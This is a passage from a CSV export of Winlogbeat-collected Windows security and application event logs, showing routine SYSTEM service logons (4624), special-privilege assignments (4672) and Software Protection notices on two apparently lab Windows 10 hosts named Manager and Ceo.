	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31166,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:18:57.102",9njsA4QByII7dpeEhs64,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:18:58.727","Oct 23, 2022 @ 16:19:03.463",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31167,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:16:02.055",VnjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:16:03.203","Oct 23, 2022 @ 16:16:26.868",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"2,452","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31164,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:16:02.055",V3jqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:16:03.207","Oct 23, 2022 @ 16:16:26.870",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"2,452","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31165,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:10:21.549","9XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:10:22.563","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:59:21Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:59:21Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3903,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:09:49.561","83jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:09:51.117","Oct 23, 2022 @ 16:16:15.923",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"5,176","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28774,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:09:49.561","9HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:09:51.117","Oct 23, 2022 @ 16:16:15.924",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"5,176","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28775,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:09:49.511","8njpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:09:50.026","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3902,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:06:16.411","8XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:06:17.381","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:59:16Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:59:16Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3901,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:46.332","73jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:05:47.436","Oct 23, 2022 @ 16:16:15.921",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28772,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:05:46.332","8HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:05:47.436","Oct 23, 2022 @ 16:16:15.923",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28773,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:46.306","7HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:05:46.846","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3900,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:46.272","7njpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:05:47.436","Oct 23, 2022 @ 16:16:15.921",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28771,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:46.271","7XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:05:47.436","Oct 23, 2022 @ 16:16:15.920",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
